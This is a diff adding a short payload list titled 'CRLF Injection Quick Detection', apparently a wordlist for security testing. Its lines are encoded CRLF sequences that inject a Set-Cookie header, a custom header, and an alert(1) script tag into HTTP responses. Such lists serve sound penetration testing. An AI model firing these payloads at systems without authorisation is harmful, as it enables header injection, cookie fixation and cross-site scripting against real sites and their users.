@@ -1,0 +1,7 @@
+# CRLF Injection Quick Detection
+%0d%0aSet-Cookie:crlf=injection
+%0aSet-Cookie:crlf=injection
+%0dSet-Cookie:crlf=injection
+%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aX-Injected:header
+\r\nSet-Cookie:crlf=injection
